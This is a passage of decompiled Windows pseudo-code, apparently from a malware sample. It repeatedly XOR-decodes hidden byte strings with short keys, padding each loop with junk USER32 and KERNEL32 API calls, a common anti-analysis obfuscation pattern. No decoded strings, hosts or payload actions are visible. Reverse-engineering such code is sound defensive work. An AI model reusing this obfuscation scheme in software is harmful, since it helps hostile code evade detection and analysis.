(*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar4 != 0xc1748e) {\n            *(iVar8 + var_78h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_78h)[&var_18h - var_78h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xf);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 0x1b;\n    var_1ch._1_1_ = 0x34;\n    var_1ch._2_1_ = 0x16;\n    var_1ch._3_1_ = 4;\n    var_18h._0_1_ = 0xd;\n    var_18h._1_1_ = 0x3d;\n    var_18h._2_1_ = 0x23;\n    var_18h._3_1_ = 0x2c;\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 0x17;\n    var_14h._2_1_ = 0x18;\n    var_14h._3_1_ = 0x23;\n    var_10h._0_1_ = 0x2c;\n    var_10h._1_1_ = 0x17;\n    var_10h._2_1_ = 7;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x22;\n    var_ch._2_1_ = 4;\n    var_ch._3_1_ = 0x6e;\n    var_8h = 0x61455148;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6e);\n    fcn.00401000(0x14);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar4 != 0xb90506) {\n            *(iVar8 + var_70h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_70h)[&var_1ch - var_70h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    fcn.0040ba72();\n    var_24h._0_1_ = 0x27;\n    var_24h._1_1_ = 0x16;\n    var_24h._2_2_ = 0x2a0e;\n    var_20h._0_1_ = 8;\n    var_20h._1_1_ = 0x11;\n    var_20h._2_1_ = 0x3c;\n    var_20h._3_1_ = 0x2d;\n    var_1ch._0_1_ = 0x25;\n    var_1ch._1_1_ = 6;\n    var_1ch._3_1_ = 0;\n    var_18h._0_1_ = 0x32;\n    var_18h._1_1_ = 0x22;\n    var_18h._2_1_ = 0x13;\n    var_18h._3_1_ = 0x24;\n    var_14h._0_1_ = 1;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x3d;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 0x18;\n    var_10h._1_1_ = 0x16;\n    var_10h._2_1_ = 0x3d;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 99;\n    var_8h = 0x4b5a7374;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 99);\n    var_1ch._2_1_ = var_1ch._1_1_;\n    fcn.00401000(0x19);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar4 != 0x22079e) {\n            *(iVar8 + var_68h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_68h)[&var_24h - var_68h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x19);\n    fcn.0040ba72();\n    var_20h._0_1_ = 0x3b;\n    var_20h._1_1_ = 0x32;\n    var_20h._2_1_ = 0x2e;\n    var_20h._3_1_ = 0x28;\n    var_1ch._0_1_ = 0x33;\n    var_1ch._1_1_ = 0xc;\n    var_1ch._2_1_ = 0x13;\n    var_1ch._3_1_ = 0x10;\n    var_18h._0_1_ = 0x2e;\n    var_18h._1_1_ = 0x24;\n    var_18h._2_1_ = 0xd;\n    var_18h._3_1_ = 0x25;\n    var_14h._0_1_ = 0x32;\n    var_14h._1_1_ = 0x35;\n    var_14h._2_1_ = 0x3b;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0xe;\n    var_10h._2_1_ = 0x22;\n    var_10h._3_1_ = 0x35;\n    var_ch._0_1_ = 0xd;\n    var_ch._1_1_ = 0x57;\n    var_8h = 0x47625768;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x52);\n    fcn.00401000(0x16);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar4 != 0xae21aa) {\n            *(iVar8 + var_60h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_60h)[&var_20h - var_60h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x16);\n    fcn.0040ba72();\n    var_20h._3_1_ = 6;\n    var_24h._0_1_ = 0x1a;\n    var_24h._1_1_ = 8;\n    var_24h._2_2_ = 0x2c38;\n    var_20h._0_1_ = 4;\n    var_20h._1_1_ = 0x3d;\n    var_20h._2_1_ = 8;\n    var_1ch._0_1_ = 5;\n    var_1ch._2_1_ = 0x26;\n    var_1ch._3_1_ = 0xb;\n    var_18h._0_1_ = 2;\n    var_18h._1_1_ = 0x39;\n    var_18h._2_1_ = 0x12;\n    var_18h._3_1_ = 0x19;\n    var_14h._0_1_ = 0x1f;\n    var_14h._1_1_ = 2;\n    var_14h._2_1_ = 0x23;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x25;\n    var_10h._1_1_ = 8;\n    var_10h._2_1_ = 0xc;\n    var_10h._3_1_ = 0x30;\n    var_ch._0_1_ = 0x77;\n    var_8h = 0x556b6d49;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x77);\n    var_1ch._1_1_ = var_1ch;\n    fcn.00401000(0x19);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar4 != 0x32b325) {\n            *(iVar8 + var_58h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_58h)[&var_24h - var_58h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x19);\n    fcn.0040ba72();\n    var_20h._0_1_ = 0x22;\n    var_20h._1_1_ = 0x1c;\n    var_20h._2_1_ = 0x31;\n    var_20h._3_1_ = 0x15;\n    var_1ch._0_1_ = 0x24;\n    var_1ch._1_1_ = 0x1f;\n    var_1ch._2_1_ = 0x14;\n    var_1ch._3_1_ = 0x14;\n    var_18h._0_1_ = 0x16;\n    var_18h._1_1_ = 5;\n    var_18h._2_1_ = 0x3a;\n    var_18h._3_1_ = 0xe;\n    var_14h._0_1_ = 0x21;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_1_ = 0xb;\n    var_14h._3_1_ = 0x1a;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 7;\n    var_10h._2_1_ = 0x14;\n    var_10h._3_1_ = 0x1e;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 0x6c;\n    var_8h = 0x6c627971;\n    var_4h._0_2_ = 0x6b57;\n    fcn.00401000(0x16);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar4 != 0x679cc3) {\n            *(iVar8 + var_50h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_50h)[&var_20h - var_50h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x16);\n    fcn.0040ba72();\n    var_28h = 0x30212612;\n    var_24h._0_1_ = 0x2e;\n    var_24h._1_1_ = 0x3f;\n    var_24h._2_2_ = 0x2f28;\n    var_20h._0_1_ = 0x14;\n    var_20h._1_1_ = 0x11;\n    var_20h._2_1_ = 0x28;\n    var_20h._3_1_ = 0x37;\n    var_1ch._0_1_ = 0x26;\n    var_1ch._1_1_ = 0x2f;\n    var_1ch._2_1_ = 0x14;\n    var_1ch._3_1_ = 0x12;\n    var_18h._0_1_ = 0x33;\n    var_18h._1_1_ = 0x36;\n    var_18h._2_1_ = 0x22;\n    var_18h._3_1_ = 0x26;\n    var_14h._0_1_ = 2;\n    var_14h._1_1_ = 0x31;\n    var_14h._2_1_ = 0x11;\n    var_14h._3_1_ = 0x2b;\n    var_10h._0_1_ = 0x28;\n    var_10h._1_1_ = 0x35;\n    var_10h._2_1_ = 0x18;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 0x24;\n    var_ch._3_1_ = 0x43;\n    var_8h = 0x42714341;\n    var_4h._0_2_ = 0x5941;\n    fcn.00401000(0x20);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar4 != 0x5722b) {\n            *(iVar8 + var_48h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_48h)[&var_28h - var_48h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x20);\n    fcn.0040ba72();\n    var_28h = 0x5f1c1761;\n    var_24h._0_1_ = 0x29;\n    var_24h._1_1_ = 0x2a;\n    var_24h._2_2_ = 0x1357;\n    var_20h._0_1_ = 0x26;\n    var_20h._1_1_ = 0x54;\n    var_20h._2_1_ = 8;\n    var_20h._3_1_ = 0x39;\n    var_1ch._0_1_ = 0x41;\n    var_1ch._1_1_ = 0x17;\n    var_1ch._2_1_ = 5;\n    var_1ch._3_1_ = 0x43;\n    var_18h._0_1_ = 0x23;\n    var_18h._1_1_ = 0x37;\n    var_18h._2_1_ = 0x40;\n    var_18h._3_1_ = 0x1b;\n    var_14h._0_1_ = 0x21;\n    var_14h._1_1_ = 0x48;\n    var_14h._2_1_ = 0x1a;\n    var_14h._3_1_ = 0x2a;\n    var_10h._0_1_ = 0x5b;\n    var_10h._1_1_ = 4;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x5d;\n    var_ch._0_1_ = 0x2f;\n    var_ch._1_1_ = 0x3f;\n    var_ch._2_1_ = 0x57;\n    var_ch._3_1_ = 0x72;\n    var_8h = 0x31557232;\n    var_4h._0_2_ = 0x584a;\n    fcn.00401000(0x20);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar4 != 0x200265) {\n            *(iVar8 + var_44h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_44h)[&var_28h - var_44h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x20);\n    fcn.0040ba72();\n    var_24h._0_1_ = 0x11;\n    var_24h._1_1_ = 9;\n    var_24h._2_2_ = 0x1c0c;\n    var_20h._0_1_ = 0x17;\n    var_20h._1_1_ = 0x23;\n    var_20h._2_1_ = 0x18;\n    var_20h._3_1_ = 0x2a;\n    var_1ch._0_1_ = 0x3e;\n    var_1ch._1_1_ = 0x13;\n    var_1ch._2_1_ = 0x25;\n    var_1ch._3_1_ = 9;\n    var_18h._0_1_ = 0x29;\n    var_18h._1_1_ = 7;\n    var_18h._2_1_ = 0x1e;\n    var_18h._3_1_ = 0x27;\n    var_14h._0_1_ = 0x3c;\n    var_14h._1_1_ = 0x3d;\n    var_14h._2_1_ = 7;\n    var_14h._3_1_ = 4;\n    var_10h._0_1_ = 0x2b;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x2a;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 0x17;\n    var_ch._1_1_ = 0x42;\n    var_8h = 0x6e4f6c42;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x72);\n    fcn.00401000(0x1a);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar4 != 0xc40597) {\n            *(iVar8 + var_bch) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_bch)[&var_24h - var_bch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1a);\n    fcn.0040ba72();\n    var_24h._0_1_ = 0x61;\n    var_24h._1_1_ = 0x21;\n    var_24h._2_2_ = 0x314;\n    var_20h._0_1_ = 0xc;\n    var_20h._1_1_ = 0x53;\n    var_20h._2_1_ = 0x30;\n    var_20h._3_1_ = 0x32;\n    var_1ch._0_1_ = 0x21;\n    var_1ch._1_1_ = 0xc;\n    var_1ch._2_1_ = 0x40;\n    var_1ch._3_1_ = 0x29;\n    var_18h._0_1_ = 0x36;\n    var_18h._1_1_ = 0x1f;\n    var_18h._2_1_ = 0xc;\n    var_18h._3_1_ = 0x5c;\n    var_14h._0_1_ = 0x30;\n    var_14h._1_1_ = 7;\n    var_14h._2_1_ = 3;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 0x44;\n    var_10h._1_1_ = 0x2d;\n    var_10h._2_1_ = 0x3b;\n    var_10h._3_1_ = 0x14;\n    var_ch._0_1_ = 0xe;\n    var_ch._1_1_ = 0x57;\n    var_ch._2_1_ = 0x44;\n    var_8h = 0x71574432;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x69);\n    fcn.00401000(0x1b);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar4 != 0xa6bceb) {\n            *(iVar8 + var_7ch) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_7ch)[&var_24h - var_7ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1b);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 3;\n    var_1ch._1_1_ = 0x24;\n    var_1ch._2_1_ = 0x37;\n    var_1ch._3_1_ = 0x19;\n    var_18h._0_1_ = 0x27;\n    var_18h._1_1_ = 0x3b;\n    var_18h._2_1_ = 0x34;\n    var_18h._3_1_ = 5;\n    var_14h._0_1_ = 0x28;\n    var_14h._1_1_ = 0x36;\n    var_14h._2_1_ = 0x39;\n    var_14h._3_1_ = 0x37;\n    var_10h._0_1_ = 0x1c;\n    var_10h._1_1_ = 0x14;\n    var_10h._2_1_ = 0x21;\n    var_10h._3_1_ = 0x37;\n    var_ch._0_1_ = 0x24;\n    var_ch._1_1_ = 0x75;\n    var_8h = 0x78754150;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x44);\n    fcn.00401000(0x12);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar4 != 0x5f58a9) {\n            *(iVar8 + var_40h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_40h)[&var_1ch - var_40h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x12);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 0x2a;\n    var_1ch._1_1_ = 0x22;\n    var_1ch._2_1_ = 0x28;\n    var_1ch._3_1_ = 0x54;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0xd;\n    var_18h._2_1_ = 0x28;\n    var_18h._3_1_ = 8;\n    var_14h._0_1_ = 0x54;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0xb;\n    var_14h._3_1_ = 0x2e;\n    var_10h._0_1_ = 0xc;\n    var_10h._1_1_ = 0x58;\n    var_10h._2_1_ = 0xf;\n    var_10h._3_1_ = 0x1c;\n    var_ch._0_1_ = 0x20;\n    var_ch._1_1_ = 0x1f;\n    var_ch._2_1_ = 0x31;\n    var_8h = 0x317a4779;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 99);\n    fcn.00401000(0x13);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0x2950bc) {\n            *(iVar8 + var_74h) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_74h)[&var_1ch - var_74h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x13);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 0x11;\n    var_1ch._1_1_ = 0x56;\n    var_1ch._2_1_ = 2;\n    var_1ch._3_1_ = 0xf;\n    var_18h._0_1_ = 0x1a;\n    var_18h._1_1_ = 3;\n    var_18h._2_1_ = 0x26;\n    var_18h._3_1_ = 0x5c;\n    var_14h._0_1_ = 0x26;\n    var_14h._1_1_ = 9;\n    var_14h._2_1_ = 0x3f;\n    var_14h._3_1_ = 5;\n    var_10h._0_1_ = 0x2b;\n    var_10h._1_1_ = 0x45;\n    var_10h._2_1_ = 0x38;\n    var_10h._3_1_ = 0xb;\n    var_ch._0_1_ = 10;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x33;\n    var_8h = 0x67513342;\n    var_4h._0_2_ = 0x776f;\n    fcn.00401000(0x14);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar4 != 0xa18779) {\n            *(iVar8 + var_ach) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_ach)[&var_1ch - var_ach];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x14);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 0x20;\n    var_1ch._1_1_ = 0x2e;\n    var_1ch._2_1_ = 0x17;\n    var_1ch._3_1_ = 0x2f;\n    var_18h._0_1_ = 0x25;\n    var_18h._1_1_ = 0x17;\n    var_18h._2_1_ = 0x14;\n    var_18h._3_1_ = 0x1b;\n    var_14h._0_1_ = 0x21;\n    var_14h._1_1_ = 0x23;\n    var_14h._2_1_ = 0x31;\n    var_14h._3_1_ = 0xb;\n    var_10h._0_1_ = 0x1f;\n    var_10h._1_1_ = 0x2e;\n    var_10h._2_1_ = 0x34;\n    var_10h._3_1_ = 0x2f;\n    var_ch._0_1_ = 0x47;\n    var_8h = 0x4a534b73;\n    var_4h._0_2_ = 0x6247;\n    fcn.00401000(0x11);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar4 != 0xcaa434) {\n            *(iVar8 + var_6ch) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_6ch)[&var_1ch - var_6ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x11);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 0x3d;\n    var_1ch._1_1_ = 0xb;\n    var_1ch._2_1_ = 0x27;\n    var_1ch._3_1_ = 0xf;\n    var_18h._0_1_ = 0x53;\n    var_18h._1_1_ = 2;\n    var_18h._2_1_ = 0x1a;\n    var_18h._3_1_ = 0x3e;\n    var_14h._0_1_ = 0x14;\n    var_14h._1_1_ = 0x13;\n    var_14h._2_1_ = 0x41;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 2;\n    var_10h._1_1_ = 0xb;\n    var_10h._2_1_ = 1;\n    var_10h._3_1_ = 0x1f;\n    var_ch._0_1_ = 0x37;\n    var_8h = 0x7a666e6e;\n    var_4h._0_2_ = 0x6b37;\n    fcn.00401000(0x11);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar4 != 0x2e6227) {\n            *(iVar8 + var_94h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_94h)[&var_1ch - var_94h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x11);\n    fcn.0040ba72();\n    var_28h = 0x4a2a5714;\n    var_24h._0_1_ = 6;\n    var_24h._2_2_ = 0x5f22;\n    var_20h._0_1_ = 0x3c;\n    var_20h._1_1_ = 0x5d;\n    var_20h._2_1_ = 3;\n    var_20h._3_1_ = 0x1b;\n    var_1ch._0_1_ = 0x35;\n    var_1ch._1_1_ = 0x5d;\n    var_1ch._2_1_ = 0x17;\n    var_1ch._3_1_ = 0x5e;\n    var_18h._0_1_ = 0x10;\n    var_18h._1_1_ = 0x1c;\n    var_18h._2_1_ = 0x33;\n    var_18h._3_1_ = 0x62;\n    var_14h._0_1_ = 0xb;\n    var_14h._1_1_ = 0x5a;\n    var_14h._2_1_ = 3;\n    var_14h._3_1_ = 0x1b;\n    var_10h._0_1_ = 0x2b;\n    var_10h._1_1_ = 0x57;\n    var_10h._2_1_ = 0x1e;\n    var_10h._3_1_ = 0x56;\n    var_ch._0_1_ = 0x75;\n    var_8h = 0x33793247;\n    var_4h._0_2_ = 0x7275;\n    var_24h._1_1_ = var_24h;\n    fcn.00401000(0x1d);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar4 != 0xe1d82c) {\n            *(iVar8 + var_64h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_64h)[&var_28h - var_64h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1d);\n    fcn.0040ba72();\n    var_20h._0_1_ = 0x3f;\n    var_20h._1_1_ = 0x30;\n    var_20h._2_1_ = 0x73;\n    var_20h._3_1_ = 0x5a;\n    var_1ch._0_1_ = 0xd;\n    var_1ch._1_1_ = 0x26;\n    var_1ch._2_1_ = 0xb;\n    var_1ch._3_1_ = 0x30;\n    var_18h._0_1_ = 0x7e;\n    var_18h._1_1_ = 0x5d;\n    var_18h._2_1_ = 0x18;\n    var_18h._3_1_ = 0x21;\n    var_14h._0_1_ = 10;\n    var_14h._1_1_ = 0x2c;\n    var_14h._2_1_ = 0x60;\n    var_14h._3_1_ = 0x40;\n    var_10h._0_1_ = 5;\n    var_10h._1_1_ = 0x3e;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x55;\n    var_ch._1_1_ = 0x55;\n    var_ch._2_1_ = 9;\n    var_ch._3_1_ = 0x48;\n    var_8h = 0x3230556c;\n    var_4h._0_2_ = 0x486c;\n    var_10h._2_1_ = var_10h;\n    fcn.00401000(0x18);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar4 != 0x8e6eec) {\n            *(iVar8 + var_b4h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_b4h)[&var_20h - var_b4h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x18);\n    fcn.0040ba72();\n    var_24h._0_1_ = 0x18;\n    var_24h._1_1_ = 0x14;\n    var_24h._2_2_ = 0x551e;\n    var_20h._0_1_ = 0x5b;\n    var_20h._1_1_ = 0x24;\n    var_20h._2_1_ = 5;\n    var_20h._3_1_ = 0x29;\n    var_1ch._0_1_ = 99;\n    var_1ch._1_1_ = 0x5e;\n    var_1ch._2_1_ = 0x3e;\n    var_18h._0_1_ = 0x28;\n    var_18h._1_1_ = 0x5f;\n    var_18h._2_1_ = 0x41;\n    var_18h._3_1_ = 0x25;\n    var_14h._0_1_ = 0x21;\n    var_14h._1_1_ = 0x3e;\n    var_14h._2_1_ = 0x59;\n    var_14h._3_1_ = 0x40;\n    var_10h._0_1_ = 0x22;\n    var_10h._1_1_ = 0x1d;\n    var_10h._2_1_ = 0x29;\n    var_10h._3_1_ = 0x57;\n    var_ch._0_1_ = 0x53;\n    var_ch._1_1_ = 0x4b;\n    var_8h = 0x304c714b;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x36);\n    var_1ch._3_1_ = var_20h._2_1_;\n    fcn.00401000(0x1a);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar4 != 0x274c21) {\n            *(iVar8 + var_5ch) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_5ch)[&var_24h - var_5ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1a);\n    fcn.0040ba72();\n    var_1ch._0_1_ = 0x24;\n    var_1ch._1_1_ = 0x20;\n    var_1ch._2_1_ = 0x3e;\n    var_1ch._3_1_ = 0x5e;\n    var_18h._0_1_ = 3;\n    var_18h._1_1_ = 0x58;\n    var_18h._2_1_ = 0x14;\n    var_18h._3_1_ = 0x2e;\n    var_14h._0_1_ = 0x3b;\n    var_14h._1_1_ = 0x42;\n    var_14h._2_1_ = 0xe;\n    var_14h._3_1_ = 0x41;\n    var_10h._0_1_ = 0x1e;\n    var_10h._1_1_ = 0x29;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x57;\n    var_ch._0_1_ = 2;\n    var_ch._1_1_ = 0x37;\n    var_8h = 0x306b4577;\n    var_4h._0_2_ = 0x3767;\n    fcn.00401000(0x12);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar4 != 0x1adf32) {\n            *(iVar8 + var_8ch) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_8ch)[&var_1ch - var_8ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x12);\n    fcn.0040ba72();\n    var_20h._0_1_ = 0x18;\n    var_20h._1_1_ = 0x50;\n    var_20h._2_1_ = 0x31;\n    var_20h._3_1_ = 0x4b;\n    var_1ch._0_1_ = 9;\n    var_1ch._1_1_ = 6;\n    var_1ch._2_1_ = 10;\n    var_1ch._3_1_ = 0x52;\n    var_18h._0_1_ = 7;\n    var_18h._1_1_ = 0x5c;\n    var_18h._2_1_ = 0x13;\n    var_18h._3_1_ = 0x35;\n    var_14h._0_1_ = 0x39;\n    var_14h._1_1_ = 0x5c;\n    var_14h._2_1_ = 0x14;\n    var_14h._3_1_ = 0x5b;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x2c;\n    var_10h._3_1_ = 0x50;\n    var_ch._0_1_ = 0x62;\n    var_8h = 0x3262354b;\n    var_4h._0_2_ = 0x6567;\n    fcn.00401000(0x15);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar4 != 0x3704eb) {\n            *(iVar8 + var_54h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_54h)[&var_20h - var_54h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x15);\n    fcn.0040ba72();\n    var_24h._0_1_ = 0x3b;\n    var_24h._1_1_ = 0x32;\n    var_24h._2_2_ = 0x209;\n    var_20h._0_1_ = 0x2b;\n    var_20h._1_1_ = 0x29;\n    var_20h._2_1_ = 4;\n    var_20h._3_1_ = 0x32;\n    var_1ch._0_1_ = 8;\n    var_1ch._1_1_ = 9;\n    var_1ch._2_1_ = 0x26;\n    var_1ch._3_1_ = 0x2e;\n    var_18h._0_1_ = 0xf;\n    var_18h._1_1_ = 0x36;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 5;\n    var_14h._0_1_ = 0x25;\n    var_14h._1_1_ = 0x25;\n    var_14h._2_1_ = 0x38;\n    var_14h._3_1_ = 0x25;\n    var_10h._0_1_ = 0x25;\n    var_10h._1_1_ = 0x1a;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x27;\n    var_ch._0_1_ = 0xd;\n    var_ch._1_1_ = 0x30;\n    var_ch._2_1_ = 0x29;\n    var_ch._3_1_ = 0x6c;\n    var_8h = 0x6c4c5768;\n    var_4h._0_2_ = 0x4b4a;\n    fcn.00401000(0x1c);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar4 != 0x9acb44) {\n            *(iVar8 + var_a4h) = *(&var_8h + iVar8 % var_34h) ^ (iVar8 + var_a4h)[&var_24h - var_a4h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1c);\n    fcn.0040ba72();\n    var_20h._0_1_ = 0x23;\n    var_20h._1_1_ = 0x35;\n    var_20h._2_1_ = 0x75;\n    var_20h._3_1_ = 0x2c;\n    var_1ch._0_1_ = 0x29;\n    var_1ch._1_1_ = 0x11;\n    var_1ch._2_1_ = 0x37;\n    var_1ch._3_1_ = 0x5d;\n    var_18h._0_1_ = 0x1b;\n    var_18h._1_1_ = 0x28;\n    var_18h._2_1_ = 0x1c;\n    var_18h._3_1_ = 0x25;\n    var_14h._0_1_ = 0x55;\n    var_14h._1_1_ = 0x28;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x39;\n    var_10h._1_1_ = 0x4e;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x2b;\n    var_ch._0_1_ = 0x15;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x5d;\n    var_ch._3_1_ = 0x4d;\n    var_8h = 0x4d385070;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x47);\n    fcn.00401000(0x18);\n    iVar8 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar4 != 0x60436a) {\n            *(iVar8 + var_4ch) = *(&var_8h + iVar8 % var_30h) ^ (iVar8 + var_4ch)[&var_20h - var_4ch];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x18);\n    fcn.0040ba72();\n    var_20h._0_1_ = 0x17;\n    var_20h._1_1_ = 0x12;\n    var_20h._2_1_ = 8;\n    var_20h._3_1_ = 0xe;\n    var_1ch._0_1_ = 0x45;\n    var_1ch._1_1_ = 0x21;\n    var_1ch._2_1_ = 5;\n    var_1ch._3_1_ = 0x32;\n    var_18h._0_1_ = 0xc;\n    var_18h._1_1_ = 0x5b;\n    var_18h._2_1_ = 0x25;\n    var_18h._3_1_ = 3;\n    var_14h._0_1_ = 0x24;\n    var_14h._1_1_ = 0x33;\n    var_14h._2_1_ = 0x47;\n    var_14h._3_1_ = 0x2d;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_1_ = 0xf;\n    var_10h._3_1_ = 0x50;\n    var_ch._0_1_ = 0x23;\n    var_ch._1_1_ = 0x12;\n    var_ch._2_1_ = 0x41;\n    var_8h = 0x63417744;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x35);\n    fcn.00401000(0x17);\n    iVar8 = 0;\n    do {\n        